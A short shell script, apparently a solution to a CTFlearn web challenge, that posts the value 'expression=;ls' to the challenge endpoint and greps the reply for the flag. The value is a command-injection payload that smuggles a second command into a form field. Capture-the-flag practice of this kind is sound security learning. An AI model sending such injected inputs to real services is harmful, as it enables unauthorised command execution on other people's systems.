#!/bin/sh

payload='expression=;ls'
endpoint='https://web.ctflearn.com/web7/'

curl -sLd $payload $endpoint | grep -i ctf
